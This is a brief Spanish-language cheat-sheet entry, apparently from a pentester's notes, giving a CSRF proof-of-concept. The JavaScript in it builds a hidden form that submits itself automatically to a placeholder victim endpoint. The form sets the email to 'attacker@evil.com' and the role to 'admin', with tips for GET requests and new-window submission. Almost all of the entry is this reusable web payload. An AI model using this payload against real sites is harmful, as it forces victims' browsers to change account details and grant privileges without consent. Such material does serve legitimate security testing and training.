# Formulario auto-submit en JS (CSRF PoC)

> Crea el form por JS, agrega los campos y lo envía solo. Cambiá URL, método y campos.

```html
<script>
const f = document.createElement('form');
f.method = 'POST';
f.action = 'https://VICTIMA.com/endpoint';

const campos = { email: 'attacker@evil.com', role: 'admin' };
for (const name in campos) {
  const i = document.createElement('input');
  i.type = 'hidden';
  i.name = name;
  i.value = campos[name];
  f.appendChild(i);
}

document.body.appendChild(f);
f.submit();
</script>
```

Para **GET**: `f.method='GET'`. Para enviar en otra ventana (ver respuesta): `f.target='_blank'`.

## 🔗 [[exfil-oastify]] · [[../../vulnerabilities/003-csrf/csrf|CSRF]]
